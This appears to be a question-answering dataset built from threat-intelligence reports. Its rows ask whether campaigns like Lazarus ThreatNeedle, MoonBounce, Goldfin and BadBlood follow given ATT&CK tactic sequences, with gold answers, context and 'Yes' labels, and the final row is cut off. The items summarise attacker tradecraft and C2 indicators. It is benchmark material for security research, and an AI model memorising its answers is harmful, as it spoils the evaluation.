2729,7,7-Discovery-T1007-System Service Discovery,"After achieving credential access by executing the Responder tool to acquire login credentials, is the Lazarus group likely to conduct discovery activities such as system service discovery before using Windows commands and WMIC for lateral movement to establish network connections and copy malware to remote hosts?","Discovery: The group conducted discovery activities such as network share, process, system network configuration, system owner/user, system network connections, system information, file and directory, and system service discovery.","Reconnaissance: The Lazarus group conducted reconnaissance by using spear-phishing emails embellished with personal information gathered from publicly available sources. The emails targeted various departments within the defense industry, claiming to have urgent updates on COVID-19. The attackers registered email accounts that resembled the medical center's real email addresses and included the actual personal data of the deputy head doctor in the signature. The phishing emails contained a malicious Word document designed to download and execute additional malware.
Initial Access: The initial access was achieved through spear-phishing emails containing malicious Word documents. The documents, which were unrelated to COVID-19, contained macros that, when enabled, would download and execute additional malware. The attackers sent follow-up emails instructing recipients on how to enable macros. The infection was successful when an employee opened one of the attachments, allowing the attackers to gain remote control of the infected system.
Execution: The malware, known as ThreatNeedle, was executed in a multistage deployment procedure. It began with a spear-phishing document that loaded the next stage as a backdoor running in-memory. The ThreatNeedle backdoor was used for initial reconnaissance and to deploy additional malware for lateral movement.
Persistence: The ThreatNeedle installer-type malware was responsible for implanting the next stage loader-type malware and registering it for auto-execution to achieve persistence. The loader-type malware existed in several variations and served the primary purpose of loading the final stage of the ThreatNeedle malware in-memory.
Defense Evasion: The Lazarus group utilized various techniques to evade detection, including deleting log files from the router and using a custom web shell script. They also employed masquerading techniques, such as renaming system utilities and modifying registry keys to hide their activities.
Credential Access: The group executed a credential harvesting tool named Responder from one of the victim machines to acquire login credentials, which were then used for lateral movement.
Lateral Movement: Lateral movement was achieved using Windows commands and the Windows Management Instrumentation Command-line (WMIC) to establish network connections and copy malware to remote hosts. The attackers also compromised a router virtual machine to overcome network segmentation and access the restricted network segment.
Collection: The group archived collected data using utilities to prepare for exfiltration.
Command and Control: The command-and-control infrastructure involved multiple servers for various stages, with the attackers configuring the Apache web server on a compromised router to use it as a proxy server between the organization's corporate and restricted segments.
Exfiltration: Data exfiltration was performed using a custom tunneling tool with a custom encryption routine to create a covert channel. The group also used a Trojanized VNC Uploader to upload data to the C2 server via HTTP POST requests.
Others: The Lazarus group's campaign against the defense industry was attributed to their use of the ThreatNeedle malware cluster, which is an advanced version of Manuscrypt (a.k.a. NukeSped). The group demonstrated its ability to circumvent security measures such as network segmentation. Connections were found between this campaign and other Lazarus group campaigns, including DeathNote, Operation AppleJeus, and Bookcode.",Yes,kaspersky-ics-cert-lazarus-targets-defense-industry-with-threatneedle-en-20210225
2732,7,7-Exfiltration-T1041-Exfiltration Over C2 Channel,"Prior to using Trojanized VNC Uploader to upload data and communicate with the C2 server for exfiltration, is the Lazarus group likely to have archived collected data using various utilities for preparation?",Exfiltration: Data exfiltration was performed using a custom tunneling tool with a custom encryption routine to create a covert channel. The group also used a Trojanized VNC Uploader to upload data to the C2 server via HTTP POST requests.,"Reconnaissance: The Lazarus group conducted reconnaissance by using spear-phishing emails embellished with personal information gathered from publicly available sources. The emails targeted various departments within the defense industry, claiming to have urgent updates on COVID-19. The attackers registered email accounts that resembled the medical center's real email addresses and included the actual personal data of the deputy head doctor in the signature. The phishing emails contained a malicious Word document designed to download and execute additional malware.
Initial Access: The initial access was achieved through spear-phishing emails containing malicious Word documents. The documents, which were unrelated to COVID-19, contained macros that, when enabled, would download and execute additional malware. The attackers sent follow-up emails instructing recipients on how to enable macros. The infection was successful when an employee opened one of the attachments, allowing the attackers to gain remote control of the infected system.
Execution: The malware, known as ThreatNeedle, was executed in a multistage deployment procedure. It began with a spear-phishing document that loaded the next stage as a backdoor running in-memory. The ThreatNeedle backdoor was used for initial reconnaissance and to deploy additional malware for lateral movement.
Persistence: The ThreatNeedle installer-type malware was responsible for implanting the next stage loader-type malware and registering it for auto-execution to achieve persistence. The loader-type malware existed in several variations and served the primary purpose of loading the final stage of the ThreatNeedle malware in-memory.
Defense Evasion: The Lazarus group utilized various techniques to evade detection, including deleting log files from the router and using a custom web shell script. They also employed masquerading techniques, such as renaming system utilities and modifying registry keys to hide their activities.
Credential Access: The group executed a credential harvesting tool named Responder from one of the victim machines to acquire login credentials, which were then used for lateral movement.
Discovery: The group conducted discovery activities such as network share, process, system network configuration, system owner/user, system network connections, system information, file and directory, and system service discovery.
Lateral Movement: Lateral movement was achieved using Windows commands and the Windows Management Instrumentation Command-line (WMIC) to establish network connections and copy malware to remote hosts. The attackers also compromised a router virtual machine to overcome network segmentation and access the restricted network segment.
Collection: The group archived collected data using utilities to prepare for exfiltration.
Command and Control: The command-and-control infrastructure involved multiple servers for various stages, with the attackers configuring the Apache web server on a compromised router to use it as a proxy server between the organization's corporate and restricted segments.
Others: The Lazarus group's campaign against the defense industry was attributed to their use of the ThreatNeedle malware cluster, which is an advanced version of Manuscrypt (a.k.a. NukeSped). The group demonstrated its ability to circumvent security measures such as network segmentation. Connections were found between this campaign and other Lazarus group campaigns, including DeathNote, Operation AppleJeus, and Bookcode.",Yes,kaspersky-ics-cert-lazarus-targets-defense-industry-with-threatneedle-en-20210225
2743,72,72-Credential Access-T1552-Unsecured Credentials,"After the malware establishes persistence on the victim's device and collects data such as keystrokes and account information, is it likely that it will collect sensitive information like FileZilla FTP server credentials and browser data before initiating communications with the command center at the IP address 192.169.82.86?","Credential Access: The malware collected a variety of sensitive information, including FileZilla FTP server credentials, account data from local browsers, messaging clients, email clients, and license information of some installed applications.","Reconnaissance: The attackers initiated their campaign by sending spear phishing emails to senior members and executives of targeted organizations, aiming to lure them with what appeared to be payment documents from a bank in the UAE, Emirates NBD. These emails contained compressed executables or phishing links, with fake sources used to deliver the emails to victims.
Resource Development: The malware used in the attacks, based on the Hawkeye commercial spyware, was designed to collect a variety of data from the victim's device, including passwords, keystrokes, and screenshots. This commercial off-the-shelf malware provided anonymity for the attackers, making attribution more difficult.
Initial Access: The initial access to the victim's network was achieved through spear phishing emails that included a 7z file with a malware executable disguised as a payment instruction document. The emails targeted senior members and executives within the organizations.
Execution: Upon execution, the malware self-deployed and configured persistence using anti-debugging and timeout techniques. It then began collecting data from the victim's device, such as keystrokes, clipboard data, and account data from various applications and clients.
Persistence: The malware established persistence on the victim's device to maintain access and continue its data collection activities.
Defense Evasion: The malware employed anti-debugging and timeout techniques to evade detection and maintain its presence on the victim's device.
Collection: The malware collected data such as keystrokes, clipboard data, and account information from various sources on the victim's device.
Command and Control: The malware communicated with a command center at the IP address 192.169.82.86 to deliver collected information, which included passwords, clipboard data, and screenshots. The IP address appeared to belong to a compromised device running multiple malware campaigns.
Exfiltration: Data exfiltration was primarily conducted via HTTP GET posts sent to the IP address 192.169.82.86 and email messages sent to addresses associated with compromised organizations operating in manufacturing and technology services.
Others: The attackers targeted over 130 organizations in more than 30 countries, focusing on industrial, engineering, and manufacturing sectors. The campaign, traced back to March 2015, seemed financially motivated. The attackers were particularly active in the Middle East, with a significant number of victims located in the United Arab Emirates. Phishing pages and links were also used, with victims connecting from various devices including Windows, Mac OS X, Ubuntu, iPhone, and Android. Kaspersky Lab detected the malware using heuristic signatures and provided a list of indicators of compromise, including filenames, paths, MD5 hashes, domains, and phishing URLs related to the malware.",Yes,Operation Ghoul_ targeted attacks on industrial and engineering organizations - Securelist
2744,72,72-Command and Control-T1071-Application Layer Protocol,"After the malware collected data such as keystrokes, clipboard content, and account information from various sources on the victim's device, is it likely that it established communication with a command center at the IP address 192.169.82.86 before exfiltrating the collected information through HTTP GET posts and email messages?","Command and Control: The malware communicated with a command center at the IP address 192.169.82.86 to deliver collected information, which included passwords, clipboard data, and screenshots. The IP address appeared to belong to a compromised device running multiple malware campaigns.","Reconnaissance: The attackers initiated their campaign by sending spear phishing emails to senior members and executives of targeted organizations, aiming to lure them with what appeared to be payment documents from a bank in the UAE, Emirates NBD. These emails contained compressed executables or phishing links, with fake sources used to deliver the emails to victims.
Resource Development: The malware used in the attacks, based on the Hawkeye commercial spyware, was designed to collect a variety of data from the victim's device, including passwords, keystrokes, and screenshots. This commercial off-the-shelf malware provided anonymity for the attackers, making attribution more difficult.
Initial Access: The initial access to the victim's network was achieved through spear phishing emails that included a 7z file with a malware executable disguised as a payment instruction document. The emails targeted senior members and executives within the organizations.
Execution: Upon execution, the malware self-deployed and configured persistence using anti-debugging and timeout techniques. It then began collecting data from the victim's device, such as keystrokes, clipboard data, and account data from various applications and clients.
Persistence: The malware established persistence on the victim's device to maintain access and continue its data collection activities.
Defense Evasion: The malware employed anti-debugging and timeout techniques to evade detection and maintain its presence on the victim's device.
Credential Access: The malware collected a variety of sensitive information, including FileZilla FTP server credentials, account data from local browsers, messaging clients, email clients, and license information of some installed applications.
Collection: The malware collected data such as keystrokes, clipboard data, and account information from various sources on the victim's device.
Exfiltration: Data exfiltration was primarily conducted via HTTP GET posts sent to the IP address 192.169.82.86 and email messages sent to addresses associated with compromised organizations operating in manufacturing and technology services.
Others: The attackers targeted over 130 organizations in more than 30 countries, focusing on industrial, engineering, and manufacturing sectors. The campaign, traced back to March 2015, seemed financially motivated. The attackers were particularly active in the Middle East, with a significant number of victims located in the United Arab Emirates. Phishing pages and links were also used, with victims connecting from various devices including Windows, Mac OS X, Ubuntu, iPhone, and Android. Kaspersky Lab detected the malware using heuristic signatures and provided a list of indicators of compromise, including filenames, paths, MD5 hashes, domains, and phishing URLs related to the malware.",Yes,Operation Ghoul_ targeted attacks on industrial and engineering organizations - Securelist
2748,72,72-Collection-T1056-Input Capture,"After the malware achieved persistence on the victim's device by configuring anti-debugging and timeout techniques and began data collection, is it likely that the malware used input capture to collect sensitive information such as passwords and account data from various applications?","Collection: The malware collected data such as keystrokes, clipboard data, and account information from various sources on the victim's device.","Reconnaissance: The attackers initiated their campaign by sending spear phishing emails to senior members and executives of targeted organizations, aiming to lure them with what appeared to be payment documents from a bank in the UAE, Emirates NBD. These emails contained compressed executables or phishing links, with fake sources used to deliver the emails to victims.
Resource Development: The malware used in the attacks, based on the Hawkeye commercial spyware, was designed to collect a variety of data from the victim's device, including passwords, keystrokes, and screenshots. This commercial off-the-shelf malware provided anonymity for the attackers, making attribution more difficult.
Initial Access: The initial access to the victim's network was achieved through spear phishing emails that included a 7z file with a malware executable disguised as a payment instruction document. The emails targeted senior members and executives within the organizations.
Execution: Upon execution, the malware self-deployed and configured persistence using anti-debugging and timeout techniques. It then began collecting data from the victim's device, such as keystrokes, clipboard data, and account data from various applications and clients.
Persistence: The malware established persistence on the victim's device to maintain access and continue its data collection activities.
Defense Evasion: The malware employed anti-debugging and timeout techniques to evade detection and maintain its presence on the victim's device.
Credential Access: The malware collected a variety of sensitive information, including FileZilla FTP server credentials, account data from local browsers, messaging clients, email clients, and license information of some installed applications.
Command and Control: The malware communicated with a command center at the IP address 192.169.82.86 to deliver collected information, which included passwords, clipboard data, and screenshots. The IP address appeared to belong to a compromised device running multiple malware campaigns.
Exfiltration: Data exfiltration was primarily conducted via HTTP GET posts sent to the IP address 192.169.82.86 and email messages sent to addresses associated with compromised organizations operating in manufacturing and technology services.
Others: The attackers targeted over 130 organizations in more than 30 countries, focusing on industrial, engineering, and manufacturing sectors. The campaign, traced back to March 2015, seemed financially motivated. The attackers were particularly active in the Middle East, with a significant number of victims located in the United Arab Emirates. Phishing pages and links were also used, with victims connecting from various devices including Windows, Mac OS X, Ubuntu, iPhone, and Android. Kaspersky Lab detected the malware using heuristic signatures and provided a list of indicators of compromise, including filenames, paths, MD5 hashes, domains, and phishing URLs related to the malware.",Yes,Operation Ghoul_ targeted attacks on industrial and engineering organizations - Securelist
2751,73,73-Initial Access-T1566-Phishing,"After the SOCKSBOT malware was involved in spear-phishing campaigns targeting banks like Halyk Bank and PrivatBank, is it likely that execution involved using a JavaScript dropper from an obfuscated script to deliver a PowerShell script such as setup.ps1 to ensure actions like UAC bypass before achieving persistence via creating Windows services for running PowerShell scripts like checkupdate.ps1?","Initial Access: iDefense analysts reported two spear-phishing campaigns in October 2017 involving the malware family SOCKSBOT, spoofing Halyk Bank and PrivatBank. The phishing emails contained identical messages and hyperlinks, suggesting the use of a phishing kit. The campaign spoofed various banks in CIS countries, including Halyk Bank, PrivatBank, Idea Bank, and Tejara Bank, with the most recent observed on May 28, 2018.","Execution: The infection chain began with a JavaScript dropper delivered via a ZIP archive named dog.zip, containing a JavaScript file with heavily obfuscated code. Once deobfuscated, the code searched for antivirus processes and dropped a PowerShell script named setup.ps1, which established persistence and used a modified version of the Invoke-EventVwrBypass function from the Empire Post-exploitation framework to bypass UAC. A second-stage PowerShell script named checkupdate.ps1 was also used, containing a PowerShell reflective loader script with a DLL binary embedded as Base64-encoded data.
Persistence: The PowerShell script setup.ps1 created a cmdlet to establish persistence by creating a Windows service named 'Check for updates' set to 'delay-auto' start and execute checkupdate.ps1. Additionally, a dropper executable binary was used to reflectively load SOCKSBOT into a chosen process, ensuring persistence by creating copies of itself in system directories and spoofing legitimate services with similar names.
Defense Evasion: The SOCKSBOT implant, delivered as a Base64-encoded string, was reflectively loaded in a newly started svchost.exe process, existing only in memory and never touching the disk. It used the ObtainUserAgentString API to determine the default user-agent of the machine and communicated with the C2 server using a pseudo-randomly generated URI.
Command and Control: The SOCKSBOT implant communicated with C2 servers using sockets and specific HTTP status codes to perform actions such as creating new sockets, enumerating processes, taking screenshots, and performing file operations. Three different C2 servers were observed: 5.8.88[.]64, 46.166.163[.]243, and 5.135.73[.]113.
Others: The Goldfin campaign, using SOCKSBOT, targeted financial institutions in CIS countries for financial gain. The campaign is not believed to be associated with CANDLEFISH but has infrastructure overlap and shared use of a PowerShell obfuscation technique with FIN7. Domains used in the campaign had identical WHOIS information and network hosting overlap with domains associated with FIN7. The campaign also used a variant of a PowerShell obfuscation technique similar to PowerSploit, previously observed in malware associated with FIN7. Mitigation recommendations include blocking access URIs and IP addresses associated with the campaign, and verifying the existence of artifacts such as randomly named files in system directories, a service named 'Check for updates', and a svchost.exe process without wininit.exe as the parent process.",Yes,Accenture-Goldfin-Security-Alert-1
2758,74,74-Command and Control-T1071-Application Layer Protocol,"After generating raw malicious payloads in various formats for implementation and staging during execution, is it likely that Cobalt Strike's C2 server responds with an HTTP 200 OK to deliver beacon.dll before using beacon.dll to control an infected host?","Command and Control: Cobalt Strike's C2 server responds with an HTTP 200 OK, containing a very large binary blob known as ""beacon.dll."" This is the core functionality of Cobalt Strike, which will be used to control an infected host. After retrieving the DLL, it is loaded via a technique called Reflective DLL injection.","Initial Access: Cobalt Strike is a paid penetration-testing tool that malicious actors have used to deploy ""Listeners"" on victim machines. Listeners are at the core of Cobalt Strike, allowing adversaries to configure the C2 method used in an attack. Every attack or payload generated in Cobalt Strike requires the targeted user to select a Listener to embed within it, determining how an infected host will reach out to the C2 server to retrieve additional payloads and instructions. Users can configure the payload type, name, C2 server and port, and other options such as named pipes or proxy servers. Listeners designed only to connect infected hosts laterally include the SMB and TCP beacons.
Execution: Cobalt Strike generates raw, malicious payloads that an attacker could implement into other attacks. The payload can be generated as raw shell code or preformatted in almost any language desired, including PowerShell, Python, and Java, among many others. The generated payload can act as a staging payload for the Cobalt beacon, to be plugged into an exploit of the user's choice. The payload is only a bunch of raw bytes and won't just run if a user double-clicked the file. The adversary would have to load the shellcode and jump to the desired entry point.
Others: Cisco Talos has updated its SNORT and ClamAV signatures to detect Cobalt Strike, version 4.0. The research performed resulted in more than 50 signatures between Snort and ClamAV combined, covering over 400 Cobalt Strike samples. The detection is intended to provide robust coverage for Cobalt Strike at its core but is not exhaustive. Large-scale attack frameworks like Cobalt Strike are always evolving.",Yes,2020.09.11_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike
2761,75,75-Defense Evasion-T1564-Hide Artifacts,"After securing a foothold in the victim's system through a UEFI firmware-level compromise and tampering with the CORE_DXE component for execution, is MoonBounce likely to operate entirely in memory to evade detection before gaining lateral movement within the network?","Defense Evasion: The MoonBounce implant operates in memory only, facilitating a fileless attack with a small footprint. It does not leave traces on the hard drive. The infection technique is stealthy, involving the modification of an existing firmware component rather than adding a new one, making it difficult to detect and mitigate.","Initial Access: At the end of 2021, Kaspersky's Firmware Scanner detected a UEFI firmware-level compromise. The attackers modified a component within the firmware's image, allowing them to intercept the machine's boot sequence and introduce an infection chain. The UEFI firmware was tampered with to embed malicious code named MoonBounce. This implant, located on the SPI flash on the motherboard, persists across disk formatting or replacement.
Execution: The MoonBounce implant was incorporated into the CORE_DXE component of the UEFI firmware, which is called early in the boot sequence. It initializes essential data structures and function interfaces, including the EFI Boot Services Table. Attackers set hooks to intercept functions like AllocatePool, CreateEventEx, and ExitBootServices, diverting them to malicious shellcode appended to the CORE_DXE image. This facilitates the propagation of malicious code to other boot components, introducing a malicious driver into the Windows kernel's memory address space.
Persistence: Due to its placement on the SPI flash, the MoonBounce implant is capable of persisting in the system across disk formatting or replacement, indicating the attackers' aim to establish a longstanding foothold within the network.
Lateral Movement: The attackers executed commands after gaining a foothold in the network, indicating lateral movement and exfiltration of information from particular machines. This aligns with APT41's previous operations, where intrusions were made to intervene in targeted companies' supply chains or to steal sensitive intellectual property and personally identifiable information.
Command and Control: The user-mode malware deployed by MoonBounce reaches out to a hardcoded C&C URL to fetch another stage of the payload to run in memory. ScrambleCross, another non-UEFI implant found in the targeted network, communicated with the same infrastructure hosting the stager's payload.
Exfiltration: The attackers attempted to enumerate hosts and gather network information, copy files across SMB shares, and dump the Active Directory domain database. They used tools like Sysinternals Psexec for remote command execution and WMI for remote command execution, indicating efforts to exfiltrate data.
Others: The MoonBounce attack is attributed to APT41, a Chinese-speaking threat actor. The attack was highly targeted, with the firmware rootkit detected in a single case and other affiliated malicious samples found on multiple machines in the same network. The attackers maintained infrastructure from at least March 2020, with servers still active at the end of 2021. The group continues to be active despite legal proceedings and maintains a high level of proficiency in developing its toolset. Vendors are taking precautions against UEFI threats, such as enabling Secure Boot by default. It is recommended to update UEFI firmware regularly, enable BootGuard and Trust Platform Modules, and use security products with firmware image visibility.",Yes,MoonBounce_ the dark side of UEFI firmware _ Securelist
2762,75,75-Lateral Movement-T1570-Lateral Tool Transfer,"After leveraging the MoonBounce implant's in-memory operations for defense evasion by avoiding leaving traces on the hard drive, is it likely that APT41 would execute commands within the victim's network for lateral movement and exfiltration purposes?","Lateral Movement: The attackers executed commands after gaining a foothold in the network, indicating lateral movement and exfiltration of information from particular machines. This aligns with APT41's previous operations, where intrusions were made to intervene in targeted companies' supply chains or to steal sensitive intellectual property and personally identifiable information.","Initial Access: At the end of 2021, Kaspersky's Firmware Scanner detected a UEFI firmware-level compromise. The attackers modified a component within the firmware's image, allowing them to intercept the machine's boot sequence and introduce an infection chain. The UEFI firmware was tampered with to embed malicious code named MoonBounce. This implant, located on the SPI flash on the motherboard, persists across disk formatting or replacement.
Execution: The MoonBounce implant was incorporated into the CORE_DXE component of the UEFI firmware, which is called early in the boot sequence. It initializes essential data structures and function interfaces, including the EFI Boot Services Table. Attackers set hooks to intercept functions like AllocatePool, CreateEventEx, and ExitBootServices, diverting them to malicious shellcode appended to the CORE_DXE image. This facilitates the propagation of malicious code to other boot components, introducing a malicious driver into the Windows kernel's memory address space.
Persistence: Due to its placement on the SPI flash, the MoonBounce implant is capable of persisting in the system across disk formatting or replacement, indicating the attackers' aim to establish a longstanding foothold within the network.
Defense Evasion: The MoonBounce implant operates in memory only, facilitating a fileless attack with a small footprint. It does not leave traces on the hard drive. The infection technique is stealthy, involving the modification of an existing firmware component rather than adding a new one, making it difficult to detect and mitigate.
Command and Control: The user-mode malware deployed by MoonBounce reaches out to a hardcoded C&C URL to fetch another stage of the payload to run in memory. ScrambleCross, another non-UEFI implant found in the targeted network, communicated with the same infrastructure hosting the stager's payload.
Exfiltration: The attackers attempted to enumerate hosts and gather network information, copy files across SMB shares, and dump the Active Directory domain database. They used tools like Sysinternals Psexec for remote command execution and WMI for remote command execution, indicating efforts to exfiltrate data.
Others: The MoonBounce attack is attributed to APT41, a Chinese-speaking threat actor. The attack was highly targeted, with the firmware rootkit detected in a single case and other affiliated malicious samples found on multiple machines in the same network. The attackers maintained infrastructure from at least March 2020, with servers still active at the end of 2021. The group continues to be active despite legal proceedings and maintains a high level of proficiency in developing its toolset. Vendors are taking precautions against UEFI threats, such as enabling Secure Boot by default. It is recommended to update UEFI firmware regularly, enable BootGuard and Trust Platform Modules, and use security products with firmware image visibility.",Yes,MoonBounce_ the dark side of UEFI firmware _ Securelist
2767,76,76-Initial Access-T1566-Phishing,"After conducting reconnaissance using spear-phishing emails and supply-chain technology exploits, is it likely that the Dragonfly campaign will target energy companies with spear-phishing emails to gain initial access before executing backdoor malware embedded within trusted software to run code on victim machines?","Initial Access: The Dragonfly campaign targeted energy companies around the world by leveraging spear-phishing emails that allowed attackers to download Trojan software, providing access to the victims' systems and networks.","Reconnaissance: The Dragonfly campaign conducted reconnaissance before exploiting compromised targets, carefully considering each target. They used spear-phishing emails, watering holes, and supply-chain technology exploits to gather information.
Resource Development: The Dragonfly attackers created or gained user accounts to operate stealthily within victim networks. They used remote-desktop protocol to hop among systems and connect to control servers or internal compromised servers for operations.
Execution: The Dragonfly campaign used backdoor malware embedded within trusted software to execute code on victims' machines without detection, leaving no trace on disk.
Persistence: Once the attackers gained a foothold, they created or gained user accounts to maintain access to victim networks and used remote-desktop protocol for movement.
Defense Evasion: The Dragonfly attackers incorporated code from the legitimate application TeamViewer into their backdoor to avoid detection and in-memory execution. They also used self-deleting code to remove traces of their presence.
Discovery: The Dragonfly group focused on Windows systems and used well-known practices to gather information and credentials.
Lateral Movement: The Dragonfly attackers used the remote-desktop protocol to move laterally among internal or external systems within victim networks.
Impact: The Dragonfly group has the ability to take offensive disruptive and destructive action, as seen in the 2015 attack on the Ukrainian power grid by a BlackEnergy malware family.
Others: The Dragonfly campaign has evolved since 2014, showing increased sophistication and precision in attacks. The group is likely after intellectual property or insights into the targeted sectors. McAfee Labs and the Advanced Threat Research team have uncovered related attacks targeting the pharmaceutical, financial, and accounting industries. The campaign has links to earlier attacks, with code reuse from the 2013 TeamSpy campaign and similarities to the BlackEnergy malware. McAfee Labs thanks Intezer for their assistance during the research.",Yes,Operation_Dragonfly_Analysis
2775,76,76-Discovery-T1082-System Information Discovery,"After using self-deleting code to remove traces of their presence during the defense evasion tactic, is it likely that the Dragonfly group focused on Windows systems to gather system information as part of the discovery tactic before using the remote-desktop protocol to move laterally among internal or external systems?",Discovery: The Dragonfly group focused on Windows systems and used well-known practices to gather information and credentials.,"Reconnaissance: The Dragonfly campaign conducted reconnaissance before exploiting compromised targets, carefully considering each target. They used spear-phishing emails, watering holes, and supply-chain technology exploits to gather information.
Resource Development: The Dragonfly attackers created or gained user accounts to operate stealthily within victim networks. They used remote-desktop protocol to hop among systems and connect to control servers or internal compromised servers for operations.
Initial Access: The Dragonfly campaign targeted energy companies around the world by leveraging spear-phishing emails that allowed attackers to download Trojan software, providing access to the victims' systems and networks.
Execution: The Dragonfly campaign used backdoor malware embedded within trusted software to execute code on victims' machines without detection, leaving no trace on disk.
Persistence: Once the attackers gained a foothold, they created or gained user accounts to maintain access to victim networks and used remote-desktop protocol for movement.
Defense Evasion: The Dragonfly attackers incorporated code from the legitimate application TeamViewer into their backdoor to avoid detection and in-memory execution. They also used self-deleting code to remove traces of their presence.
Lateral Movement: The Dragonfly attackers used the remote-desktop protocol to move laterally among internal or external systems within victim networks.
Impact: The Dragonfly group has the ability to take offensive disruptive and destructive action, as seen in the 2015 attack on the Ukrainian power grid by a BlackEnergy malware family.
Others: The Dragonfly campaign has evolved since 2014, showing increased sophistication and precision in attacks. The group is likely after intellectual property or insights into the targeted sectors. McAfee Labs and the Advanced Threat Research team have uncovered related attacks targeting the pharmaceutical, financial, and accounting industries. The campaign has links to earlier attacks, with code reuse from the 2013 TeamSpy campaign and similarities to the BlackEnergy malware. McAfee Labs thanks Intezer for their assistance during the research.",Yes,Operation_Dragonfly_Analysis
2779,77,77-Initial Access-T1566-Phishing,"After the actor-controlled Gmail account used in TA453's campaign impersonated a prominent Israeli physicist, is it likely that the phishing emails included a link leading to the TA453-controlled domain before the domain presented a forged Microsoft login page to harvest user credentials?","Initial Access: In late 2020, TA453, an Iranian-nexus threat actor, initiated a credential phishing campaign named BadBlood, targeting senior medical professionals in the United States and Israel. The campaign utilized an actor-controlled Gmail account, which impersonated a prominent Israeli physicist, to send phishing emails with the subject 'Nuclear weapons at a glance: Israel'. These emails contained a link to a TA453-controlled domain, 1drv[.]casa, which spoofed Microsoft's OneDrive service and presented a forged Microsoft login page to harvest user credentials.","Credential Access: The BadBlood campaign by TA453 aimed to harvest credentials of senior medical professionals specializing in genetic, neurology, and oncology research. The phishing emails directed victims to a forged Microsoft login page on the domain 1drv[.]casa, where credentials were collected. There was no indication of multi-factor authentication bypass being conducted. The use of harvested credentials by TA453 in this campaign is not fully known, but previous public reporting from CERTFA suggests that TA453 has used such credentials to exfiltrate email inbox contents and for further phishing activities.
Others: The BadBlood campaign by TA453, which is historically aligned with the Islamic Revolutionary Guard Corps (IRGC), marks a deviation from the group's typical targets, focusing instead on medical research personnel. The campaign's objective remains unclear, but it may involve collecting specific medical information or using compromised accounts for further phishing. Attribution to the IRGC is not independently confirmed by Proofpoint, but the tactics and techniques observed are consistent with historic TA453 campaigns. Related infrastructure identified by Proofpoint includes additional domains with high confidence attributed to TA453, used in similar campaigns with national security-themed lure documents. The targeting of medical research is part of a global trend of increased espionage against the medical sector.",Yes,BadBlood_ TA453 Targets US and Israeli Medical Research Personnel in Credential Phishing Campaigns _ Proofpoint US
2780,77,77-Credential Access-T1606-Forge Web Credentials,"After using phishing emails to target victims and directing them to the forged domain 1drv[.]casa impersonating Microsoft's OneDrive service, is it likely that TA453 subsequently harvested credentials of senior medical professionals specializing in genetic, neurology, and oncology research before utilizing these credentials for potential exfiltration of email inbox contents or further phishing activities?","Credential Access: The BadBlood campaign by TA453 aimed to harvest credentials of senior medical professionals specializing in genetic, neurology, and oncology research. The phishing emails directed victims to a forged Microsoft login page on the domain 1drv[.]casa, where credentials were collected. There was no indication of multi-factor authentication bypass being conducted. The use of harvested credentials by TA453 in this campaign is not fully known, but previous public reporting from CERTFA suggests that TA453 has used such credentials to exfiltrate email inbox contents and for further phishing activities.","Initial Access: In late 2020, TA453, an Iranian-nexus threat actor, initiated a credential phishing campaign named BadBlood, targeting senior medical professionals in the United States and Israel. The campaign utilized an actor-controlled Gmail account, which impersonated a prominent Israeli physicist, to send phishing emails with the subject 'Nuclear weapons at a glance: Israel'. These emails contained a link to a TA453-controlled domain, 1drv[.]casa, which spoofed Microsoft's OneDrive service and presented a forged Microsoft login page to harvest user credentials.
Others: The BadBlood campaign by TA453, which is historically aligned with the Islamic Revolutionary Guard Corps (IRGC), marks a deviation from the group's typical targets, focusing instead on medical research personnel. The campaign's objective remains unclear, but it may involve collecting specific medical information or using compromised accounts for further phishing. Attribution to the IRGC is not independently confirmed by Proofpoint, but the tactics and techniques observed are consistent with historic TA453 campaigns. Related infrastructure identified by Proofpoint includes additional domains with high confidence attributed to TA453, used in similar campaigns with national security-themed lure documents. The targeting of medical research is part of a global trend of increased espionage against the medical sector.",Yes,BadBlood_ TA453 Targets US and Israeli Medical Research Personnel in Credential Phishing Campaigns _ Proofpoint US
2784,79,79-Command and Control-T1071-Application Layer Protocol,"After the iOS malware collects information such as text messages, contact lists, and geo-location data on the victim's device during the Discovery phase, is it likely that the app will subsequently send the gathered information, write log messages, use a token for communication, and upload files during the Command and Control phase?","Command and Control: Besides collecting information from the iOS device, the app sends the information out via HTTP. It uses POST request to send messages, and GET request to receive commands.  The malware's log messages are written in HTML and color coded, making it easier for human operators to read. Error messages tend to be in red, while others are in green as shown in the figure below.  The full uniform resource identifier (URI) for C&C HTTP requests is randomly generated, according to a template agreed upon with the C&C server. The base URI can be seen in Figure 4, and parameters are chosen from the list below and appended to the base URI.  The malware uses a token to identify which module is communicating. The token is Base64 encoded data, but padded with a 5-byte random prefix so that it looks like valid Base64 data. See the first line ""ai="" part in the figure below.  Reverse engineering also revealed additional communication functions.  The app is also able to upload files via FTP protocol.","Initial Access: In our continued research on Operation Pawn Storm, we found one interesting poisoned pawn   The iOS malware we found is among those advanced malware. We believe the iOS malware gets installed on already compromised systems, and it is very similar to next stage SEDNIT malware we have found for Microsoft Windows systems.
Execution: The XAgent app is fully functional malware. After being installed on iOS 7, the app's icon is hidden and it runs in the background immediately. When we try to terminate it by killing the process, it will restart almost immediately.  Installing the malware into an iOS 8 device yields different results. The icon is not hidden and it also cannot restart automatically. This suggests that the malware was designed prior to the release of iOS 8 last September 2014.
Discovery: The app is designed to collect all kind of information on an iOS device. It is able to perform the following routines:  Collect text messages Get contact lists Get pictures Collect geo-location data Start voice recording Get a list of installed apps Get a list of processes Get the Wi-Fi status",Yes,PawnStorm_iOS
2785,79,79-Command and Control-T1102-Web Service,"Is it likely that, after collecting data such as text messages, contact lists, and geo-location information from iOS devices, the malicious XAgent app will exfiltrate this data via HTTP requests while communicating with its C&C server using a Base64 encoded token for identification?","Command and Control: Besides collecting information from the iOS device, the app sends the information out via HTTP. It uses POST request to send messages, and GET request to receive commands.  The malware's log messages are written in HTML and color coded, making it easier for human operators to read. Error messages tend to be in red, while others are in green as shown in the figure below.  The full uniform resource identifier (URI) for C&C HTTP requests is randomly generated, according to a template agreed upon with the C&C server. The base URI can be seen in Figure 4, and parameters are chosen from the list below and appended to the base URI.  The malware uses a token to identify which module is communicating. The token is Base64 encoded data, but padded with a 5-byte random prefix so that it looks like valid Base64 data. See the first line ""ai="" part in the figure below.  Reverse engineering also revealed additional communication functions.  The app is also able to upload files via FTP protocol.","Initial Access: In our continued research on Operation Pawn Storm, we found one interesting poisoned pawn   The iOS malware we found is among those advanced malware. We believe the iOS malware gets installed on already compromised systems, and it is very similar to next stage SEDNIT malware we have found for Microsoft Windows 